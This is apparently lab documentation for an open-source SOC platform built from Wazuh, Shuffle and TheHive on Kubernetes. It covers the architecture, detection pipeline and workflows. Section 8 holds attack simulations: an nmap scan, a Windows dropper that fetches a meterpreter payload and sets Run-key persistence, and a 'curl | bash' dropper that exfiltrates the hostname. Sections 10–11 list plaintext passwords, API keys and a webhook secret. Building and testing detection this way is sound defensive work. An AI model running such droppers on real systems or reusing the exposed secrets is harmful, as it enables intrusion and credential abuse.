# SOCaaS — Security Operations Center as a Service

## Project Overview

SOCaaS (Security Operations Center as a Service) is a fully open-source, cloud-native SOC platform designed for SMEs and institutions. It provides real-time threat detection, automated incident response, case management, and notification delivery — all built on open-source technologies and deployed on Kubernetes.

**Core Principle:** Complete transparency, vendor independence, and production-grade security monitoring without licensing costs.

---

## 1. Infrastructure Architecture

### 1.1 Hypervisor & Networking

| Component | Detail |
|-----------|--------|
| Hypervisor | KVM/QEMU (libvirt) |
| Host OS | Parrot OS |
| Bridge | `virbr0` — 192.168.122.0/24 |
| HAProxy | TCP load balancer on host:6443, :1514, :1515, :30000-30900 |
| Storage | `/srv/socaas` (311GB, 72% used) |

### 1.2 Virtual Machines

| VM | IP | vCPUs | RAM | Disk | Role |
|----|----|-------|-----|------|------|
| `k8s-master` | 192.168.122.10 | 2 | 4 GB | 50 GB | Kubernetes control-plane |
| `k8s-worker1` | 192.168.122.11 | 4 | 8 GB | 120 GB | SIEM workloads (Wazuh) |
| `k8s-worker2` | 192.168.122.12 | 4 | 8 GB | 120 GB | SOAR/TheHive workloads |
| `victim-01` | 192.168.122.180 | 1 | 512 MB | 5 GB | Linux victim endpoint |
| `win10-vicitm` | 192.168.122.98 | 2 | 4 GB | 60 GB | Windows victim endpoint |

All VMs are on the `virbr0` bridge (192.168.122.0/24), NAT'd to the host's external interface.

---

## 2. Kubernetes Architecture

### 2.1 Cluster

| Component | Detail |
|-----------|--------|
| Version | Kubernetes v1.28.15 |
| CNI | Calico v3.28.5 |
| Container Runtime | containerd 2.2.1 |
| Pod CIDR | 10.244.0.0/16 |
| Service CIDR | 10.96.0.0/12 |
| DNS | CoreDNS 10.96.0.10 |
| Package Manager | Helm |

### 2.2 Namespaces & Workload Distribution

| Namespace | Purpose | Node |
|-----------|---------|------|
| `socaas-system` | Helm release state | master |
| `socaas-siem` | Wazuh SIEM (manager, indexer, dashboard) | worker1 |
| `socaas-soar` | Shuffle SOAR, pipeline gateway, Redis, OpenSearch | worker2 |
| `socaas-thehive` | TheHive, Cassandra, MinIO, Elasticsearch | worker2 |

### 2.3 Key Services

| Service | Type | Port | NodePort | Namespace |
|---------|------|------|----------|-----------|
| Wazuh Manager | ClusterIP + NodePort | 1514,1515,55000 | 31514,31515,31550 | socaas-siem |
| Wazuh Indexer | ClusterIP | 9200 | — | socaas-siem |
| Wazuh Dashboard | NodePort | 5601 | 30002 | socaas-siem |
| Pipeline Gateway | NodePort | 8080 | 30001 | socaas-soar |
| Shuffle Frontend | NodePort | 80 | 30080 | socaas-soar |
| Shuffle Backend | ClusterIP | 5001 | — | socaas-soar |
| Shuffle OpenSearch | ClusterIP | 9200 | — | socaas-soar |
| Shuffle Orborus | ClusterIP | — | — | socaas-soar |
| Redis | ClusterIP | 6379 | — | socaas-soar |
| TheHive | NodePort | 9000 | 30900 | socaas-thehive |
| Cassandra | ClusterIP | 9042 | — | socaas-thehive |
| MinIO | ClusterIP | 9000,9001 | — | socaas-thehive |
| TheHive Elasticsearch | ClusterIP | 9200 | — | socaas-thehive |

---

## 3. Technology Stack

### 3.1 SIEM — Wazuh

| Component | Version | Role |
|-----------|---------|------|
| Wazuh Manager | 4.8.2 | Alert correlation, rule engine, agent management |
| Wazuh Indexer | 4.8.2 | Alert storage (OpenSearch fork) |
| Wazuh Dashboard | 4.8.2 | Web UI for alert visualization |
| Wazuh Agent (Linux) | 4.8.2 | Endpoint monitoring (victim-01) |
| Wazuh Agent (Windows) | 4.8.2 | Endpoint monitoring (win10-vicitm) |

**Key Wazuh Rules Configured:**
- Rule 4000 / 4100: UFW firewall block detection (level 12) — port scan detection
- Rule 100001-100003: Custom UFW rules for scan grouping
- Rule 554: File integrity monitoring (FIM) — malware detection
- Rule 60602: Windows Defender malware detection

**Custom Decoders:**
- Kernel UFW BLOCK decoder → extracts srcip, dstip, dstport, protocol

### 3.2 SOAR — Shuffle

| Component | Version | Role |
|-----------|---------|------|
| Shuffle Backend | 1.4.0 | Workflow engine, API |
| Shuffle Frontend | 1.4.0 | Web UI (React) |
| Shuffle Orborus | 1.4.0 | Worker execution engine (Docker containers) |
| Shuffle OpenSearch | — | Workflow/app data storage |
| Redis | 7.x | Session cache and workflow queue |

**Shuffle Apps Used:**
- Webhook (trigger)
- Shuffle Tools (Python execution for alert normalization)
- Telegram Bot (notification delivery)
- HTTP (email via Mailtrap, TheHive API calls)
- VirusTotal v3 (file hash/URL lookup)

### 3.3 Case Management — TheHive

| Component | Version | Role |
|-----------|---------|------|
| TheHive | 5.3.11-1 | Case management, alert tracking |
| Cassandra | 4.x | Primary database |
| Elasticsearch | 7.10.2 | Search index |
| MinIO | — | File/S3 object storage |

**Organization Structure:**
- `admin` — Platform administration (built-in)
- `socaas` — Operational SOC organization (custom)

### 3.4 Pipeline Gateway

| Component | Detail |
|-----------|--------|
| Language | Python 3.12 |
| Framework | `http.server` (stdlib) |
| Image | `python:3.12-alpine` |
| Port | 8080 (internal), 30001 (external via NodePort) |

**Features:**
- Wazuh alert ingestion endpoint (`/hooks/wazuh`)
- VirusTotal enrichment (IP addresses)
- Observable extraction (IPs, domains, hashes)
- Shuffle webhook forwarding
- TheHive alert creation
- **Alert deduplication** with 300 second TTL cache
- Webhook secret validation (`X-SOCaaS-Webhook-Secret`)

### 3.5 Wazuh Alert Forwarder

| Component | Detail |
|-----------|--------|
| Language | Python 3.12 |
| Image | `python:3.12-alpine` |
| Role | Sidecar in Wazuh manager pod |

Reads `/var/ossec/logs/alerts/alerts.json` in real-time and forwards every alert to the pipeline gateway via `POST /hooks/wazuh` with shared secret authentication.

---

## 4. Detection Pipeline — End-to-End Flow

```
                      ┌──────────────┐
                      │   Attacker   │
                      │ (nmap/C2/exe)│
                      └──────┬───────┘
                             │
                    ┌────────▼────────┐
                    │  Victim VM      │
                    │  (Linux/Win)    │
                    │  UFW / Win FW   │
                    └────────┬────────┘
                             │ kern.log / Event Log
                    ┌────────▼────────┐
                    │  Wazuh Agent    │
                    │  (endpoint)     │
                    └────────┬────────┘
                             │ TCP:1514
                    ┌────────▼────────┐
                    │  Wazuh Manager  │
                    │  Rule Engine    │
                    └────────┬────────┘
                             │ alerts.json
                    ┌────────▼────────┐
                    │ Alert Forwarder │
                    │ (sidecar)       │
                    └────────┬────────┘
                             │ POST /hooks/wazuh
                    ┌────────▼────────┐
                    │ Pipeline Gateway│
                    │ • Dedup         │
                    │ • VT enrichment │
                    │ • Observable    │
                    │   extraction    │
                    └───┬─────────┬───┘
                        │         │
              ┌─────────▼──┐  ┌──▼──────────┐
              │  Shuffle   │  │  TheHive     │
              │  Webhook   │  │  Alert API   │
              └─────────┬──┘  └──────────────┘
                        │
              ┌─────────▼──────────┐
              │ Shuffle Workflow   │
              │ • Normalize Alert  │
              │ • VirusTotal       │
              │ • Telegram         │
              │ • Email (Mailtrap) │
              │ • TheHive Case     │
              └────────────────────┘
```

### 4.1 Detailed Alert Flow

1. **Attack:** Attacker runs nmap scan or executes malware on victim VM
2. **Detection:** UFW/Windows Firewall logs blocked connections to kern.log/Event Log
3. **Collection:** Wazuh agent reads log files and forwards to manager via TCP:1514
4. **Correlation:** Wazuh manager applies rules (4100 for port scan, 554 for FIM, 60602 for malware)
5. **Forwarding:** Alert forwarded sidecar sends JSON alert to pipeline gateway
6. **Enrichment:** Pipeline extracts observables (IPs, domains, hashes), queries VirusTotal
7. **Deduplication:** Pipeline dedup cache suppresses duplicate alerts within 300s TTL
8. **Routing:** Pipeline forwards unique alerts to Shuffle webhook, creates TheHive alert
9. **Automation:** Shuffle workflow runs 9 actions: normalize → VT lookup → Telegram → Email → TheHive case
10. **Case Management:** TheHive creates structured case with observables, severity, and timeline

---

## 5. Shuffle Workflow — "khalil" (SOCaaS Wazuh Alert Triage)

### 5.1 Workflow Actions (Execution Order)

| # | Action | App | Description |
|---|--------|-----|-------------|
| 1 | `Webhook_1` | Webhook | Receives alert from pipeline gateway |
| 2 | `Normalize_SOC_Alert` | Shuffle Tools (Python) | Parses raw alert JSON into structured format. Extracts: rule_id, agent, srcip, dstip, observables, severity, Telegram message, email body, TheHive case payload |
| 3 | `Virustotal_v3` | VirusTotal v3 | Queries VirusTotal API for the source IP extracted by Normalize step. Returns malicious/suspicious/harmless counts |
| 4 | `Generate_AI_Recommended_Actions` | Shuffle Tools | Generates AI-based remediation recommendations |
| 5 | `Build_Context_TheHive_Email_Body` | Shuffle Tools | Constructs email body and TheHive context from alert data |
| 6 | `Send_Telegram_Notification` | Telegram Bot | Sends formatted alert to SOC Telegram channel |
| 7 | `Send_Email_Notification` | HTTP (Mailtrap) | Sends email notification via Mailtrap SMTP |
| 8 | `Create_TheHive_Case` | HTTP | Creates case in TheHive with full alert data and observables |
| 9 | `Final_Response` | Shuffle Tools | Returns completion status with workflow summary |

### 5.2 VirusTotal Integration

- **API Key:** Configured in Virustotal_v3 node
- **Query Type:** IP address lookup via `/ip_addresses/{srcip}`
- **Results:** Malicious count, suspicious count, harmless count, undetected count
- **Output:** Enriches the alert with VT verdict before case creation

---

## 6. TheHive Configuration

### 6.1 Organization Setup

| Setting | Value |
|---------|-------|
| Operational Org | `socaas` |
| Integration User | `socaas-shuffle@thehive.local` |
| Profile | `org-admin` |
| Default Org | `socaas` |
| API Header Required | `X-Organisation: socaas` |

### 6.2 API Integration

All TheHive API calls from the pipeline gateway and Shuffle workflow must include:
```
Authorization: Bearer <API_KEY>
X-Organisation: socaas
Content-Type: application/json
```

---

## 7. Deduplication Logic

### 7.1 Pipeline Gateway Dedup Cache

| Parameter | Value |
|-----------|-------|
| TTL | 300 seconds |
| Storage | In-memory dictionary (Python dict) |
| Dedup Key | `agent_name\|agent_ip\|srcip\|rule_id` |

### 7.2 Algorithm

```python
def should_forward(alert):
    key = f"{agent_name}|{agent_ip}|{srcip}|{rule_id}"
    if key in DEDUP_CACHE:
        DEDUP_CACHE[key]["count"] += 1
        return False  # suppress duplicate
    DEDUP_CACHE[key] = {"count": 1, "first_seen": now}
    return True  # forward first occurrence
```

**Result:** A 200-port nmap scan generates ~200 UFW block events → dedup reduces to ~1 forwarded alert → 1 Shuffle execution → 1 TheHive case.

---

## 8. Attack Simulation Scenarios

### 8.1 Nmap Port Scan (Linux)

```bash
sudo nmap -sS -Pn -p 1-200 192.168.122.180
```

- UFW blocks → kern.log entries → Wazuh Rule 4100 (L12) → full pipeline
- Result: `[SOCaaS][CRITICAL][scan]` case in TheHive

### 8.2 Nmap Port Scan (Windows)

Windows Firewall silently drops packets. Requires Windows Firewall logging (not configured by default). Use webhook simulation instead.

### 8.3 Malware Dropper (Windows)

```bash
# Run via SSH or double-click
C:\Users\win10-victim\AppData\Local\Temp\setup.exe
```

- Downloads EICAR test file + meterpreter payload to `AppData\Roaming\MicrosoftEdge\`
- Creates registry persistence (HKCU\Run)
- EICAR SHA256: `275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f`
- Wazuh FIM + VirusTotal hash detection
- Result: `[SOCaaS][CRITICAL][malware]` case in TheHive

### 8.4 Malware Dropper (Linux)

```bash
curl -sS http://192.168.122.1:8080/dropper.sh | bash
```

- Downloads fake C2 payload, creates persistence, exfiltrates hostname
- UFW + Wazuh detection
- Result: `[SOCaaS][CRITICAL]` case in TheHive

### 8.5 Webhook Simulation (Universal)

```bash
curl -sS -X POST http://192.168.122.1:30001/hooks/wazuh \
  -H "X-SOCaaS-Webhook-Secret: Hu2sjS8pd2CFpWixOYX0" \
  -H "Content-Type: application/json" \
  -d '{"id":"test","source":"wazuh","rule":{"id":"5715","level":15,"description":"Attack detected"},"agent":{"id":"001","name":"victim-01","ip":"192.168.122.180"},"data":{"srcip":"10.0.0.66"}}'
```

Triggers the full pipeline without needing an actual attack.

---

## 9. Service URLs & Access Points

| Service | External URL | Internal URL |
|---------|-------------|--------------|
| Wazuh Dashboard | `http://192.168.122.1:30002` | `socaas-wazuh-dashboard.socaas-siem:5601` |
| Shuffle UI | `http://192.168.122.1:30080` | `socaas-shuffle-frontend.socaas-soar:80` |
| TheHive UI | `http://192.168.122.1:30900` | `socaas-thehive.socaas-thehive:9000` |
| Pipeline Health | `http://192.168.122.1:30001/healthz` | `socaas-pipeline-gateway.socaas-soar:8080/healthz` |
| Pipeline Webhook | `http://192.168.122.1:30001/hooks/wazuh` | `socaas-pipeline-gateway.socaas-soar:8080/hooks/wazuh` |
| Simulation Page | `http://192.168.122.1:8080/` | — |

---

## 10. Credentials Map (Lab Only)

| Service | Username | Password |
|---------|----------|----------|
| Wazuh Dashboard | `admin` | `5yr9lkZkpooI84CDPJv2` |
| Wazuh API | `wazuh-wui` | `MyS3cr37P450rChangeMe` |
| Shuffle Admin | `admin@socaas.local` | `DH4GGzUXooZtiCUbNi9G` |
| TheHive Admin | `admin@thehive.local` | `secret` |
| TheHive Integration | `socaas-shuffle@thehive.local` | `shuffle-lab-2026-xyz` |
| VM SSH (Linux) | `k8s-user` | `OkjjOCtBKcpNkxX7r8FG` |
| VM SSH (Windows) | `win10-victim` | `LabPass2026!` |
| MinIO | `thehiveadmin` | `gyRkpevNEGTrytD00M9v` |

**⚠️ LAB ONLY — ROTATE ALL SECRETS BEFORE PRODUCTION**

---

## 11. API Keys & Tokens

| Service | Key | Purpose |
|---------|-----|---------|
| TheHive API | `0rMyTHik17a/SdJKZQ4+6sPEbPV7dpPa` | Pipeline + Shuffle integration |
| VirusTotal | `495a9b7ecc08efb18eb637a402be923d9dad18c38382dddcdc363fbcd1582410` | IP/hash enrichment |
| Pipeline Shared Secret | `Hu2sjS8pd2CFpWixOYX0` | Wazuh forwarder ↔ pipeline auth |

---

## 12. Network Security

### 12.1 Calico NetworkPolicies

| Namespace | Policy | Effect |
|-----------|--------|--------|
| socaas-siem | `socaas-default-deny-siem` | Block all ingress/egress by default |
| socaas-siem | `socaas-allow-siem-internal` | Allow pod-to-pod within namespace |
| socaas-siem | `socaas-allow-wazuh-to-pipeline` | Allow manager → pipeline:8080 |
| socaas-soar | `socaas-default-deny-soar` | Block all ingress/egress by default |
| socaas-soar | `socaas-allow-soar-internal-and-ui` | Allow internal + external UI access |
| socaas-soar | `socaas-allow-dns-soar` | Allow DNS egress to kube-system |
| socaas-thehive | `socaas-default-deny-ir` | Block all ingress/egress by default |
| socaas-thehive | `socaas-allow-ir-internal-and-ui` | Allow internal + external UI access |

### 12.2 Host Firewall (UFW)

- SSH: 22/tcp allowed
- Simulation server: 8080/tcp allowed

---

## 13. Storage Architecture

| Component | PVC Size | Type |
|-----------|----------|------|
| Wazuh Manager | 10 Gi | StatefulSet |
| Wazuh Indexer | 18 Gi | StatefulSet |
| Wazuh Dashboard | 3 Gi | Deployment |
| Shuffle Backend | 3 Gi | Deployment |
| Shuffle OpenSearch | 8 Gi | StatefulSet |
| Redis | 1 Gi | Deployment |
| TheHive | 4 Gi | Deployment |
| Cassandra | 15 Gi | StatefulSet |
| MinIO | 8 Gi | StatefulSet |
| TheHive Elasticsearch | 15 Gi | StatefulSet |

**Total Persistent Storage:** ~85 GB

---

## 14. VM Startup Sequence

```bash
# Start K8s cluster
virsh start k8s-master      # Wait 60s for API server
virsh start k8s-worker1     # SIEM workloads
virsh start k8s-worker2     # SOAR/TheHive workloads

# Wait for all pods Ready (~3 min)
kubectl get pods -A

# Start victim VMs (optional)
virsh start victim-01       # Linux victim
virsh start win10-vicitm    # Windows victim (use virt-viewer for GUI)
```

**Graceful Shutdown:**
```bash
virsh shutdown win10-vicitm
virsh shutdown victim-01
virsh shutdown k8s-worker2
virsh shutdown k8s-worker1
virsh shutdown k8s-master
```

---

## 15. File Locations

| Resource | Path |
|----------|------|
| Project root | `/srv/socaas/` |
| Helm charts | `/srv/socaas/SOCaaS_BLUEPRINT_MULTINODE/charts/socaas/` |
| Environment config | `/srv/socaas/SOCaaS_BLUEPRINT_MULTINODE/env/socaas.env` |
| Simulation files | `/srv/socaas/simulation/` |
| VM disk images | `/var/lib/libvirt/images/socaas/` |
| K8s config | `~/.kube/config` |
| Windows 10 ISO | `/home/khalil/Desktop/WIN 10.iso` |
| Wazuh custom rules | `/var/ossec/etc/rules/local_rules.xml` (in manager pod) |
| Pipeline gateway code | ConfigMap `socaas-pipeline-gateway` in `socaas-soar` |
| Shuffle workflow export | `/srv/socaas/khalil_workflow.json` |
| Thesis reference | `/srv/socaas/SOCaaS_Project_Overview.md` |

---

## 16. Key Technical Decisions & Lessons Learned

### 16.1 TheHive Admin Organization Trap
TheHive 5.x has a built-in `admin` organization for platform administration only. All operational objects (cases, alerts, tasks) must be created in a non-admin operational organization (`socaas`). API calls require `X-Organisation: socaas` header. Without it, 403 errors occur even with org-admin permissions.

### 16.2 Wazuh Rule Ordering
Wazuh loads default rules BEFORE local rules. A local rule with a lower ID does NOT override a default rule with a higher ID. The `overwrite="yes"` attribute in `local_rules.xml` is the only way to change default rule behavior. This is critical for UFW detection because the default rule 4100 fires at level 0 (not logged), requiring override to level 12.

### 16.3 Wazuh FIM on Windows
`%USERPROFILE%` environment variable in Wazuh config expands differently for the SYSTEM account (which runs the agent) vs. the user. Use absolute paths like `C:\Users\win10-victim\AppData` instead of `%USERPROFILE%\AppData`.

### 16.4 Docker Worker Containers (Orborus)
Shuffle's Orborus creates Docker containers for workflow execution. If Docker daemon restarts or the host reboots, stale `worker-*` containers cause name conflicts. Regular cleanup is needed:
```bash
sudo docker ps -a -q --filter name=worker- | xargs -r sudo docker rm -f
```

### 16.5 Docker DNS Resolution
Docker bridge containers on worker2 need CoreDNS to resolve K8s internal DNS names. The Docker daemon on worker2 is configured with `"dns": ["10.96.0.10", "8.8.8.8"]` in `/etc/docker/daemon.json`.

### 16.6 Pipeline Alert Flooding
Without deduplication, a 200-port nmap scan generates ~200 Wazuh alerts → 200 Shuffle executions → 200 TheHive cases. The in-memory dedup cache with 300s TTL solves this by grouping alerts by `agent_name|agent_ip|srcip|rule_id`.

---

## 17. Quantitative Metrics

| Metric | Value |
|--------|-------|
| Total VMs | 5 (3 K8s + 2 victims) |
| Total K8s Pods | 26 |
| Total K8s Services | 16 |
| Wazuh Agents | 2 (victim-01 Linux, win10-vicitm Windows) |
| Shuffle Workflow Actions | 9 |
| Wazuh Custom Rules | 4 |
| Pipeline Dedup TTL | 300s |
| Total Storage (PVCs) | ~85 GB |
| VM Total vCPUs | 13 |
| VM Total RAM | 24.5 GB |

---

## 18. MITRE ATT&CK Mapping (Detected Techniques)

| Tactic | Technique | Wazuh Rule |
|--------|-----------|------------|
| Discovery | T1046 — Network Service Scanning | Rule 4100 (UFW port scan) |
| Execution | T1204 — User Execution (malicious file) | Rule 554 (FIM new file) |
| Persistence | T1547.001 — Registry Run Keys | Wazuh Registry monitoring |
| Command & Control | T1571 — Non-Standard Port | Custom C2 detection |
| Defense Evasion | T1564.001 — Hidden Files | Wazuh FIM on hidden attributes |
| Credential Access | T1003 — OS Credential Dumping | Windows Event Log monitoring |
| Exfiltration | T1041 — Exfiltration Over C2 Channel | Network connection monitoring |

---

## 19. Future Enhancements

| Item | Description |
|------|-------------|
| AI/LLM Integration | Add GPT/Claude-based alert analysis and case summarization |
| Sysmon Integration | Deploy Sysmon on Windows for deeper endpoint visibility |
| Active Response | Wazuh active response to block attacker IPs automatically |
| Grafana Dashboards | Custom dashboards for SOC metrics (MTTD, MTTR, alert volume) |
| TLS Everywhere | HTTPS for all services (currently HTTP) |
| Multi-Tenant TheHive | Separate organizations for different SOC clients |
| Backup Automation | Scheduled PVC + etcd snapshots |
| IOC Auto-Blocking | Automated Firewall/Proxy block from VT-malicious IPs |
| Threat Intelligence Feeds | Integrate MISP or commercial TI feeds |
| SOAR Playbooks Library | Expand Shuffle workflows for phishing, DLP, insider threats |

---

*Document generated for SOCaaS lab environment. Last update: 2026-05-15.*
